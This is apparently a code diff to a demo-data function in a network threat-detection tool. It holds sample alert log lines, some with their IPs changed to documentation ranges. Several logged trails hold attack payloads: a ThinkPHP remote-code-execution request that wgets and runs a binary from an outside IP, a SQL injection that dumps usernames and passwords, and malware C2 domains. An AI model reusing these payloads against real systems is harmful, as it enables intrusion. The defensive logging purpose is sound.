     '"2024-01-11 04:29:59.610337" r2d2 2.200.107.146 49908 194.62.183.53 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 04:31:37.694446" r2d2 10.3.160.42 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 04:32:27.276141" r2d2 2.200.110.232 63424 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:33:37.351492" r2d2 2.200.110.233 63760 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 04:35:26.989314" r2d2 10.3.160.42 50600 194.147.85.62 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
+    '"2024-01-11 04:35:26.989314" r2d2 10.2.120.16 50600 203.0.113.35 443 TCP JA3 1e7c622032b0cb79401b0f7be3793a1a "emotet (malware)" abuse.ch\n' +
     '"2024-01-11 04:36:26.211750" r2d2 2.200.110.232 64703 2.200.107.169 53 UDP DNS (vio-ck-zvdnggdkkp).dynamic-m.com "dynamic domain (suspicious)" (static)\n' +
     '"2024-01-11 04:36:59.624999" r2d2 2.200.107.146 5087 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:38:17.476900" r2d2 2.200.110.233 64926 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
@@ -474,10 +474,10 @@ function getDemoCSV() {
     '"2024-01-11 04:51:56.179892" r2d2 10.1.81.47 51072 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 04:52:17.842429" r2d2 2.200.110.232 64026 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:53:31.000008" r2d2 2.200.108.59 14975,14976,14977,14979,14980,27706,27707,27708,27709,33362,33848,34236,34900,41438,44392,46104,48554,50048,50406,50498,53080,53886,59968,60556,60842 77.53.81.105 21,18282,23588,32504,34062,35102,37979,38087,38412,39327,41580,51516,55289,58758,61443,65324 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
-    '"2024-01-11 04:54:33.386434" r2d2 10.2.120.16 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 04:54:33.386434" r2d2 10.43.192.103 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 04:54:47.282535" r2d2 2.200.110.233 65236 2.200.107.168 53 UDP DNS 7tno4hib47vlep5o.42kdb12.net "teslacrypt (malware)" (static)\n' +
     '"2024-01-11 04:55:23.959518" r2d2 10.38.194.125 51864 10.1.194.234 53 UDP DNS epicunitscan.info "patchbrowse (malware)" (static)\n' +
-    '"2024-01-11 04:55:29.047104" r2d2 2001:db8:5::4 50012 2a03:2880:f12d:83:face:b00c::1 4444 UDP IP 2a03:2880:f12d:83:face:b00c::1 "cobalt strike beacon (malware)" (static)\n' +
+    '"2024-01-11 04:55:29.047104" r2d2 2001:db8:5::4 50012 2001:db8::beef 4444 UDP IP 2001:db8::beef "apt29 (malware)" (static)\n' +
     '"2024-01-11 04:55:43.385940" r2d2 2.200.110.232 64769 2.200.107.168 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 04:57:59.622742" r2d2 2.200.110.232 63709 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:58:58.968296" r2d2 10.3.160.42 19581 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -485,14 +485,14 @@ function getDemoCSV() {
     '"2024-01-11 04:59:18.017744" r2d2 2.200.107.146 14294 194.62.183.53 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 04:59:38.258863" r2d2 2.200.110.233 64043 2.200.107.168 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 05:00:57.557957" r2d2 10.3.160.42 19582 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
-    '"2024-01-11 05:01:08.704635" r2d2 10.2.120.16 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
+    '"2024-01-11 05:01:08.704635" r2d2 10.124.72.51 50011 9.9.9.9 53 UDP DNS payroll-export.internal.corp "internal watchlist (custom)" (custom)\n' +
     '"2024-01-11 05:01:38.189050" r2d2 2.200.110.232 63767 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 05:01:42.351284" r2d2 2.200.107.146 14185 192.42.93.30 53 UDP DNS taxonprofits.com "cryptowall (malware)" (static)\n' +
     '"2024-01-11 05:02:37.387525" r2d2 2.200.107.146 9839 205.251.195.176 53 UDP DNS juronu.com "pua (suspicious)" (static)\n' +
     '"2024-01-11 05:03:39.521420" r2d2 69.10.62.12 41958 2.200.109.16 80 TCP URL 2.200.109.16(/thinkphp_5.0.21/?s=index/%5cthink%5capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cd%20/tmp;wget%20http:/104.168.11.84/x86;cat%20x86%20%3e%20xdsf;chmod%20777%20xdsf;./xdsf%20thinkphp) "potential remote code execution (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:03:45.977168" r2d2 10.1.81.47 54680 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 05:03:45.977225" r2d2 10.1.81.47 54680 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
-    '"2024-01-11 05:03:46.686455" r2d2 2.200.110.232 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:03:46.686455" r2d2 10.128.3.51 50012 203.0.113.17 80 TCP URL dl.example(/setup.exe) "direct .exe download (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:03:58.224448" r2d2 2.200.110.232 49415 2.200.107.168 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 05:07:00.175361" r2d2 10.3.160.42 21570 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 05:07:02.274578" r2d2 10.3.160.42 21570 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
@@ -504,17 +504,17 @@ function getDemoCSV() {
     '"2024-01-11 05:12:02.690212" r2d2 2.200.104.184 49717 205.251.193.194 53 UDP DNS ofhappinyer.com "pushbug (malicious)" (static)\n' +
     '"2024-01-11 05:12:50.840109" r2d2 2.200.97.1 58869 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 05:12:57.921909" r2d2 2.200.107.146 15829 173.245.58.63 53 UDP DNS cdnrep.reimage.com "pua (suspicious)" (static)\n' +
-    '"2024-01-11 05:13:42.412519" r2d2 2.200.104.32 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:13:42.412519" r2d2 10.128.8.51 50010 198.51.100.99 80 TCP HTTP (198.51.100.99)/mirai.x86 "potential iot-malware download (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:14:28.453093" r2d2 2.200.110.232 64334 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 05:14:48.306206" r2d2 2.200.110.233 63783 2.200.107.168 53 UDP DNS (2td6).xyz "domain (suspicious)" (static)\n' +
     '"2024-01-11 05:14:51.910375" r2d2 2.200.105.226 59299 208.67.222.123 53 UDP DNS pool.supportxmr.com "crypto mining (suspicious)" (static)\n' +
     '"2024-01-11 05:14:59.608580" r2d2 2.200.110.232 65109 2.200.107.169 53 UDP DNS atacoinc8897.hopto.org "nanocore (malware)" (static)\n' +
     '"2024-01-11 05:16:43.394264" r2d2 2.200.110.232 63549 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
     '"2024-01-11 05:16:43.394264" "dmz probe" 2.200.110.232 63549 2.200.107.169 53 UDP DNS j0mla.sytes.net "generic (malware)" (static)\n' +
-    '"2024-01-11 05:17:06.666794" r2d2 10.2.120.16 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:17:06.666794" r2d2 10.124.72.51 50005 203.0.113.11 80 TCP URL sqli.example(/items.php?id=1%20union%20all%20select%20username,password%20from%20users) "potential sql injection (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:17:50.940589" r2d2 2.200.97.1 53242 8.8.8.8 53 UDP DNS checkip.dyndns.org "ipinfo (suspicious)" (static)\n' +
     '"2024-01-11 05:18:34.809130" r2d2 2.200.110.233 63378 2.200.107.168 53 UDP DNS un-blocking.info "bad wpad (suspicious)" (static)\n' +
-    '"2024-01-11 05:19:49.642953" r2d2 2.200.110.232 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:19:49.642953" r2d2 10.128.3.51 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:23:31.000803" r2d2 2.200.108.59 16491,16494,16495,16496,16497,16498,16503,16504,16505,16506,16507,16508,16511,16512,16513,28636,28640,28641,28642,32836,33216,33374,33588,34060,34290,34712,35286,35518,35754,35838,36392,36500,37410,37436,37672,39172,39552,42278,43056,43898,44072,44558,45354,45380,45908,45998,47982,48572,49870,49964,50316,50342,50368,50844,51080,52108,52654,53440,54046,54244,54370,54456,54848,55220,55288,55470,55730,55748,55778,55808,56422,56940,57610,58056,58724,59138,59502,59674,60484,60532,60564,60584,60794,60924 77.53.81.105 21,5163,5746,6196,13066,14027,14425,15371,15624,17037,18597,18864,19090,19173,21388,22666,22681,23906,24250,24465,25222,25666,26836,27388,27723,31319,33162,33398,33987,34093,35049,35364,40143,40541,43256,43679,43733,43911,45141,45236,45550,46165,46792,47014,47324,48095,48300,48350,48463,48588,49290,49603,49936,51240,51825,51914,53334,55047,55235,56714,57124,59144,59592,61009,62441 TCP IP 2.200.108.59 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:24:20.087644" r2d2 10.1.81.47 54820 10.1.20.50 53 UDP DNS id.remoteutilities.com "rmsrat (malware)" (static)\n' +
     '"2024-01-11 05:24:57.603725" r2d2 2.200.110.233 63499 2.200.107.168 53 UDP DNS supervision.sactown.us "ek nuclear (malicious)" (static)\n' +
@@ -530,7 +530,7 @@ function getDemoCSV() {
     '"2024-01-11 05:35:33.001805" r2d2 89.248.165.69 59731 2.200.99.103,2.200.99.113,2.200.99.115,2.200.99.117,2.200.99.119,2.200.99.127,2.200.99.72,2.200.99.73,2.200.99.74,2.200.99.76,2.200.99.78,2.200.99.79,2.200.99.82,2.200.99.86,2.200.99.87,2.200.99.91,2.200.99.92,2.200.99.93,2.200.99.94,2.200.99.95 3397,3398,3431,3432,3435,3445,3458,3477,3478,3481,3497,3510,3516,3521,3523,3524,3537,3539,3540,3574,3577,3603,3605,3612,3620,3621,3622,3627,3641,3648,3651,3652,3654,3655,3656,3696,3702,3703,3710,3755,3756,3762,3779,3856,3869,3876,3892,3905,3931,3932,3936,3942,3953,3955,3962,3993,4018,4030,4039,4103,4105,4106,4114,4131,4132,4135,4136,4151,4157,4165,4183,4199,4202,4234,4235,4288,4289,4322,4360,4372,4373,4390,4420,4421,4443,4445,4461,4482,4486,4495,4515,4531,4532,4533,4534,4552,4558,4566,4567,4580,4603,4611,4612,4620,4627,4628,4631,4653,4705,4747,4748,4758,4770,4771,4798,4799,4809,4816,4831,4832,4840,4850,4854,4855,4856,4859,4873,4874,4889,4894,4895,4901,4902,4919,4946,4964,4972,4977,4978,4990,4991,4996 TCP IP 89.248.165.69 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:35:43.003424" r2d2 89.248.165.69 59731 2.200.99.100,2.200.99.101,2.200.99.102,2.200.99.103,2.200.99.104,2.200.99.105,2.200.99.106,2.200.99.107,2.200.99.108,2.200.99.109,2.200.99.110,2.200.99.111,2.200.99.112,2.200.99.113,2.200.99.114,2.200.99.115,2.200.99.116,2.200.99.117,2.200.99.118,2.200.99.119,2.200.99.120,2.200.99.121,2.200.99.122,2.200.99.123,2.200.99.124,2.200.99.125,2.200.99.126,2.200.99.127,2.200.99.33,2.200.99.34,2.200.99.36,2.200.99.37,2.200.99.64,2.200.99.68,2.200.99.69,2.200.99.70,2.200.99.71,2.200.99.72,2.200.99.73,2.200.99.74,2.200.99.75,2.200.99.76,2.200.99.77,2.200.99.78,2.200.99.79,2.200.99.80,2.200.99.81,2.200.99.82,2.200.99.83,2.200.99.84,2.200.99.85,2.200.99.86,2.200.99.87,2.200.99.88,2.200.99.89,2.200.99.90,2.200.99.91,2.200.99.92,2.200.99.93,2.200.99.94,2.200.99.95,2.200.99.96,2.200.99.97,2.200.99.98,2.200.99.99 3391,3393,3394,3395,3396,3398,3399,3400,3401,3412,3413,3419,3420,3421,3422,3428,3429,3430,3438,3440,3441,3443,3444,3446,3447,3448,3462,3463,3464,3470,3471,3473,3474,3478,3479,3480,3486,3488,3489,3495,3496,3503,3504,3516,3518,3520,3522,3530,3531,3532,3533,3541,3542,3555,3556,3558,3559,3570,3571,3573,3574,3581,3582,3583,3584,3588,3589,3590,3591,3592,3599,3600,3601,3606,3607,3610,3614,3615,3619,3621,3631,3632,3636,3637,3639,3640,3641,3642,3643,3644,3650,3651,3652,3654,3655,3661,3662,3665,3666,3667,3668,3672,3674,3688,3689,3690,3691,3692,3694,3695,3700,3701,3702,3703,3705,3706,3715,3718,3719,3720,3722,3723,3725,3726,3727,3730,3731,3732,3734,3735,3742,3743,3744,3745,3748,3749,3757,3758,3764,3766,3773,3774,3775,3777,3778,3781,3782,3783,3785,3786,3792,3793,3794,3796,3797,3798,3799,3800,3810,3811,3816,3817,3820,3821,3824,3825,3826,3833,3834,3843,3844,3846,3847,3849,3850,3851,3853,3854,3856,3863,3864,3867,3868,3869,3871,3872,3873,3874,3877,3878,3879,3883,3884,3885,3886,3895,3896,3898,3899,3903,3905,3909,3914,3915,3918,3919,3920,3921,3922,3924,3925,3928,3929,3930,3932,3935,3937,3938,3939,3942,3949,3950,3955,3964,3967,3968,3972,3973,3974,3975,3982,3983,3984,3986,3987,3989,3990,3992,4009,4010,4011,4012,4013,4015,4017,4019,4020,4022,4026,4027,4028,4030,4034,4035,4036,4037,4038,4040,4041,4042,4056,4060,4061,4062,4063,4064,4065,4066,4067,4068,4072,4073,4078,4079,4081,4084,4085,4086,4087,4088,4089,4091,4092,4093,4094,4095,4097,4098,4113,4114,4115,4116,4117,4118,4119,4125,4126,4135,4136,4137,4138,4140,4143,4144,4145,4146,4159,4160,4164,4176,4177,4180,4185,4190,4191,4193,4205,4206,4208,4209,4210,4211,4215,4219,4223,4231,4232,4235,4236,4237,4238,4239,4241,4242,4243,4244,4245,4246,4247,4256,4257,4259,4260,4266,4267,4270,4271,4274,4275,4286,4287,4289,4290,4292,4293,4294,4295,4296,4297,4298,4302,4306,4307,4308,4311,4312,4313,4314,4319,4320,4321,4324,4325,4326,4330,4331,4336,4337,4338,4341,4342,4344,4345,4350,4354,4358,4360,4362,4363,4365,4366,4370,4371,4372,4374,4375,4376,4385,4386,4390,4395,4396,4399,4400,4401,4405,4407,4408,4409,4410,4415,4420,4421,4424,4425,4426,4435,4436,4455,4457,4458,4459,4460,4461,4465,4466,4471,4472,4473,4474,4476,4477,4483,4486,4487,4492,4504,4510,4511,4512,4515,4516,4517,4518,4519,4524,4525,4526,4528,4533,4536,4537,4538,4539,4543,4544,4554,4555,4561,4562,4569,4570,4572,4573,4574,4575,4578,4579,4581,4582,4584,4585,4586,4587,4588,4599,4600,4604,4605,4606,4607,4621,4622,4623,4624,4625,4626,4627,4629,4630,4633,4635,4636,4639,4640,4641,4649,4650,4654,4655,4656,4664,4669,4670,4674,4675,4679,4682,4683,4684,4685,4686,4687,4688,4692,4693,4699,4700,4701,4705,4706,4712,4713,4715,4716,4720,4721,4724,4725,4726,4730,4731,4732,4733,4734,4735,4736,4743,4750,4751,4754,4756,4760,4764,4774,4775,4776,4786,4790,4794,4795,4801,4802,4803,4806,4808,4812,4813,4824,4827,4831,4835,4836,4840,4841,4842,4846,4851,4864,4865,4866,4877,4881,4882,4884,4885,4886,4887,4892,4893,4901,4902,4903,4904,4908,4909,4920,4932,4933,4935,4936,4937,4938,4941,4942,4943,4944,4947,4948,4952,4953,4955,4959,4960,4962,4963,4967,4968,4972,4980,4982,4983,4985,4986,4988,4992,4993,4994,4995,4999 TCP IP 89.248.165.69 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:35:43.003428" r2d2 89.248.165.69 59731 2.200.99.100,2.200.99.101,2.200.99.102,2.200.99.103,2.200.99.104,2.200.99.105,2.200.99.106,2.200.99.107,2.200.99.108,2.200.99.109,2.200.99.110,2.200.99.111,2.200.99.112,2.200.99.113,2.200.99.114,2.200.99.115,2.200.99.116,2.200.99.117,2.200.99.118,2.200.99.119,2.200.99.120,2.200.99.121,2.200.99.122,2.200.99.123,2.200.99.124,2.200.99.125,2.200.99.126,2.200.99.127,2.200.99.33,2.200.99.34,2.200.99.36,2.200.99.37,2.200.99.64,2.200.99.68,2.200.99.69,2.200.99.70,2.200.99.71,2.200.99.72,2.200.99.73,2.200.99.74,2.200.99.75,2.200.99.76,2.200.99.77,2.200.99.78,2.200.99.79,2.200.99.80,2.200.99.81,2.200.99.82,2.200.99.83,2.200.99.84,2.200.99.85,2.200.99.86,2.200.99.87,2.200.99.88,2.200.99.89,2.200.99.90,2.200.99.91,2.200.99.92,2.200.99.93,2.200.99.94,2.200.99.95,2.200.99.96,2.200.99.97,2.200.99.98,2.200.99.99 3391,3393,3394,3395,3396,3398,3399,3400,3401,3412,3413,3420,3421,3422,3428,3429,3430,3438,3440,3441,3443,3444,3446,3447,3448,3462,3463,3464,3470,3471,3473,3474,3478,3479,3486,3488,3489,3495,3496,3503,3504,3516,3518,3520,3522,3530,3531,3532,3533,3541,3542,3555,3556,3558,3559,3570,3571,3573,3574,3581,3582,3583,3584,3588,3589,3590,3591,3592,3599,3600,3601,3606,3607,3610,3614,3615,3619,3621,3631,3632,3636,3637,3639,3641,3642,3643,3644,3650,3651,3652,3654,3655,3661,3662,3665,3666,3667,3668,3672,3674,3688,3689,3690,3691,3692,3694,3695,3700,3701,3702,3703,3705,3706,3715,3718,3719,3720,3722,3723,3725,3726,3727,3730,3731,3732,3734,3735,3742,3743,3744,3745,3748,3749,3757,3758,3764,3766,3773,3774,3775,3777,3778,3781,3782,3783,3785,3786,3792,3793,3794,3796,3797,3798,3799,3800,3810,3811,3816,3817,3820,3821,3824,3825,3826,3833,3834,3843,3844,3846,3847,3849,3850,3851,3853,3854,3856,3863,3864,3867,3868,3869,3871,3872,3873,3874,3877,3878,3879,3883,3884,3885,3886,3895,3896,3898,3899,3903,3905,3909,3914,3915,3918,3919,3920,3921,3922,3924,3925,3928,3929,3930,3932,3935,3937,3938,3939,3942,3949,3950,3955,3964,3967,3968,3972,3973,3974,3975,3982,3983,3984,3986,3987,3989,3990,3992,4009,4010,4011,4012,4013,4015,4017,4019,4020,4022,4026,4027,4028,4030,4034,4035,4036,4037,4038,4040,4041,4042,4060,4061,4062,4063,4064,4065,4066,4067,4068,4072,4073,4078,4079,4081,4084,4085,4086,4087,4088,4089,4091,4092,4093,4094,4095,4097,4098,4113,4114,4115,4116,4117,4118,4125,4126,4135,4136,4138,4140,4143,4144,4145,4146,4159,4160,4164,4176,4177,4180,4185,4190,4191,4193,4205,4206,4208,4209,4210,4211,4215,4219,4223,4231,4232,4235,4236,4237,4238,4239,4241,4242,4243,4244,4245,4246,4247,4256,4257,4259,4260,4266,4267,4270,4271,4274,4275,4287,4289,4290,4292,4293,4294,4295,4296,4297,4298,4302,4306,4307,4308,4311,4312,4313,4314,4319,4320,4321,4324,4325,4326,4330,4331,4336,4337,4338,4341,4342,4344,4345,4350,4354,4358,4360,4362,4363,4365,4366,4370,4371,4372,4374,4375,4376,4385,4386,4390,4395,4396,4399,4400,4401,4405,4407,4408,4409,4410,4415,4420,4421,4425,4426,4435,4436,4455,4457,4458,4459,4460,4461,4465,4466,4471,4472,4473,4474,4476,4477,4483,4486,4487,4492,4504,4510,4511,4512,4515,4516,4517,4518,4519,4524,4525,4526,4528,4533,4536,4537,4538,4539,4543,4544,4554,4555,4561,4562,4569,4570,4572,4573,4574,4575,4578,4579,4581,4582,4584,4585,4586,4587,4588,4599,4600,4604,4605,4606,4607,4621,4622,4623,4624,4625,4626,4627,4629,4630,4633,4635,4636,4639,4640,4641,4649,4650,4654,4655,4664,4669,4670,4674,4675,4679,4682,4683,4684,4685,4686,4687,4688,4692,4693,4699,4700,4701,4705,4706,4712,4713,4715,4720,4721,4724,4725,4726,4730,4731,4732,4733,4734,4735,4736,4750,4751,4754,4756,4760,4764,4774,4775,4776,4790,4794,4795,4801,4802,4803,4806,4808,4812,4813,4824,4827,4831,4835,4836,4840,4841,4842,4846,4851,4864,4865,4866,4877,4881,4882,4884,4885,4886,4887,4892,4893,4901,4902,4903,4904,4908,4909,4920,4932,4933,4935,4936,4937,4938,4941,4942,4943,4944,4947,4948,4952,4953,4955,4959,4960,4962,4963,4967,4968,4972,4980,4982,4983,4985,4986,4988,4992,4993,4994,4995 TCP IP 89.248.165.69 "potential port scanning" (heuristic)\n' +
-    '"2024-01-11 05:35:56.452886" r2d2 10.2.120.16 51000 91.219.236.18 443 TCP IPORT 91.219.236.18:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
+    '"2024-01-11 05:35:56.452886" r2d2 10.43.192.103 51000 203.0.113.77 443 TCP IPORT 203.0.113.77:443 "potential periodic beaconing (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:36:12.774482" r2d2 2.200.104.32 3791 2.23.97.208 80 TCP UA "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40" "user agent (suspicious)" (heuristic)\n' +
     '"2024-01-11 05:36:18.000404" r2d2 89.248.165.69 59731 2.200.99.100,2.200.99.101,2.200.99.102,2.200.99.103,2.200.99.104,2.200.99.105,2.200.99.106,2.200.99.107,2.200.99.108,2.200.99.109,2.200.99.110,2.200.99.111,2.200.99.112,2.200.99.113,2.200.99.114,2.200.99.115,2.200.99.116,2.200.99.117,2.200.99.118,2.200.99.119,2.200.99.120,2.200.99.121,2.200.99.122,2.200.99.123,2.200.99.124,2.200.99.125,2.200.99.126,2.200.99.127,2.200.99.33,2.200.99.34,2.200.99.36,2.200.99.37,2.200.99.64,2.200.99.68,2.200.99.69,2.200.99.70,2.200.99.71,2.200.99.72,2.200.99.73,2.200.99.74,2.200.99.75,2.200.99.76,2.200.99.77,2.200.99.78,2.200.99.79,2.200.99.80,2.200.99.81,2.200.99.82,2.200.99.83,2.200.99.84,2.200.99.85,2.200.99.86,2.200.99.87,2.200.99.88,2.200.99.89,2.200.99.90,2.200.99.91,2.200.99.92,2.200.99.93,2.200.99.94,2.200.99.95,2.200.99.96,2.200.99.97,2.200.99.98,2.200.99.99 3390,3391,3397,3398,3405,3409,3410,3411,3415,3416,3417,3428,3432,3433,3437,3440,3441,3447,3451,3452,3453,3461,3462,3463,3467,3468,3469,3470,3471,3478,3479,3483,3484,3492,3493,3498,3499,3500,3503,3504,3511,3512,3518,3519,3527,3528,3529,3531,3542,3548,3549,3558,3559,3564,3565,3570,3571,3579,3583,3584,3590,3591,3594,3595,3609,3610,3612,3616,3617,3624,3628,3629,3632,3634,3635,3637,3638,3641,3642,3656,3659,3660,3662,3669,3670,3674,3675,3679,3680,3689,3701,3702,3707,3710,3711,3715,3717,3718,3722,3726,3727,3728,3730,3731,3732,3739,3740,3747,3748,3751,3752,3753,3758,3759,3767,3768,3769,3773,3777,3778,3779,3785,3786,3790,3796,3808,3811,3812,3816,3818,3819,3823,3825,3826,3828,3831,3832,3833,3835,3841,3842,3843,3844,3845,3846,3854,3858,3859,3860,3863,3868,3877,3883,3884,3886,3887,3889,3891,3893,3895,3896,3897,3901,3902,3904,3905,3911,3912,3914,3915,3919,3920,3929,3930,3931,3933,3934,3935,3946,3947,3954,3955,3956,3957,3965,3966,3967,3969,3971,3972,3979,3980,3982,3983,3984,3985,3991,3992,3993,3994,3996,3997,3998,4005,4006,4007,4017,4018,4020,4021,4024,4025,4026,4027,4031,4032,4034,4035,4036,4037,4042,4044,4045,4057,4058,4068,4070,4071,4075,4076,4077,4082,4083,4085,4086,4088,4089,4090,4108,4109,4110,4121,4122,4123,4128,4129,4133,4134,4135,4140,4141,4148,4156,4157,4160,4164,4170,4171,4179,4180,4184,4188,4189,4191,4192,4198,4208,4209,4211,4212,4214,4215,4218,4219,4220,4221,4222,4229,4230,4231,4232,4233,4238,4239,4240,4241,4242,4244,4252,4259,4260,4266,4267,4269,4270,4272,4280,4281,4282,4284,4285,4290,4293,4294,4296,4297,4308,4312,4317,4318,4329,4330,4332,4333,4341,4344,4345,4351,4354,4355,4356,4359,4360,4361,4362,4363,4365,4370,4371,4374,4377,4378,4380,4381,4382,4383,4384,4386,4387,4388,4392,4393,4402,4403,4405,4406,4407,4408,4412,4413,4416,4418,4419,4421,4422,4423,4425,4426,4428,4429,4430,4431,4432,4433,4434,4435,4436,4437,4438,4439,4440,4441,4443,4444,4446,4447,4453,4454,4459,4463,4464,4465,4466,4470,4471,4472,4477,4481,4482,4486,4487,4488,4495,4496,4498,4501,4502,4503,4504,4508,4509,4513,4514,4515,4518,4519,4520,4521,4523,4524,4529,4530,4533,4534,4537,4538,4539,4540,4546,4547,4548,4553,4554,4557,4558,4563,4564,4565,4569,4570,4571,4572,4573,4581,4582,4585,4589,4590,4591,4592,4596,4597,4599,4600,4602,4605,4608,4609,4610,4613,4614,4615,4621,4622,4624,4625,4633,4634,4635,4636,4639,4640,4641,4647,4648,4650,4664,4665,4666,4669,4672,4673,4675,4676,4683,4684,4685,4690,4691,4692,4693,4700,4703,4704,4709,4710,4712,4713,4715,4716,4718,4719,4720,4725,4726,4727,4728,4735,4736,4740,4741,4742,4743,4744,4751,4753,4760,4761,4762,4767,4768,4769,4770,4771,4776,4777,4778,4786,4787,4791,4792,4793,4794,4795,4796,4805,4806,4808,4812,4813,4820,4821,4823,4830,4835,4842,4845,4849,4850,4856,4857,4858,4859,4861,4866,4867,4869,4874,4875,4881,4882,4891,4892,4893,4897,4900,4901,4902,4909,4910,4911,4912,4919,4927,4928,4931,4932,4933,4934,4935,4940,4943,4956,4959,4960,4961,4963,4975,4976,4979,4980,4982,4983,4984,4985,4987,4990,4991 TCP IP 89.248.165.69 "potential port scanning" (heuristic)\n' +
     '"2024-01-11 05:36:18.000404" "dmz probe" 89.248.165.69 59731 2.200.99.100,2.200.99.101,2.200.99.102,2.200.99.103,2.200.99.104,2.200.99.105,2.200.99.106,2.200.99.107,2.200.99.108,2.200.99.109,2.200.99.110,2.200.99.111,2.200.99.112,2.200.99.113,2.200.99.114,2.200.99.115,2.200.99.116,2.200.99.117,2.200.99.118,2.200.99.119,2.200.99.120,2.200.99.121,2.200.99.122,2.200.99.123,2.200.99.124,2.200.99.125,2.200.99.126,2.200.99.127,2.200.99.33,2.200.99.34,2.200.99.36,2.200.99.37,2.200.99.64,2.200.99.68,2.200.99.69,2.200.99.70,2.200.99.71,2.200.99.72,2.200.99.73,2.200.99.74,2.200.99.75,2.200.99.76,2.200.99.77,2.200.99.78,2.200.99.79,2.200.99.80,2.200.99.81,2.200.99.82,2.200.99.83,2.200.99.84,2.200.99.85,2.200.99.86,2.200.99.87,2.200.99.88,2.200.99.89,2.200.99.90,2.200.99.91,2.200.99.92,2.200.99.93,2.200.99.94,2.200.99.95,2.200.99.96,2.200.99.97,2.200.99.98,2.200.99.99 3390,3391,3397,3398,3405,3409,3410,3411,3415,3416,3417,3428,3432,3433,3437,3440,3441,3447,3451,3452,3453,3461,3462,3463,3467,3468,3469,3470,3471,3478,3479,3483,3484,3492,3493,3498,3499,3500,3503,3504,3511,3512,3518,3519,3527,3528,3529,3531,3542,3548,3549,3558,3559,3564,3565,3570,3571,3579,3583,3584,3590,3591,3594,3595,3609,3610,3612,3616,3617,3624,3628,3629,3632,3634,3635,3637,3638,3641,3642,3656,3659,3660,3662,3669,3670,3674,3675,3679,3680,3689,3701,3702,3707,3710,3711,3715,3717,3718,3722,3726,3727,3728,3730,3731,3732,3739,3740,3747,3748,3751,3752,3753,3758,3759,3767,3768,3769,3773,3777,3778,3779,3785,3786,3790,3796,3808,3811,3812,3816,3818,3819,3823,3825,3826,3828,3831,3832,3833,3835,3841,3842,3843,3844,3845,3846,3854,3858,3859,3860,3863,3868,3877,3883,3884,3886,3887,3889,3891,3893,3895,3896,3897,3901,3902,3904,3905,3911,3912,3914,3915,3919,3920,3929,3930,3931,3933,3934,3935,3946,3947,3954,3955,3956,3957,3965,3966,3967,3969,3971,3972,3979,3980,3982,3983,3984,3985,3991,3992,3993,3994,3996,3997,3998,4005,4006,4007,4017,4018,4020,4021,4024,4025,4026,4027,4031,4032,4034,4035,4036,4037,4042,4044,4045,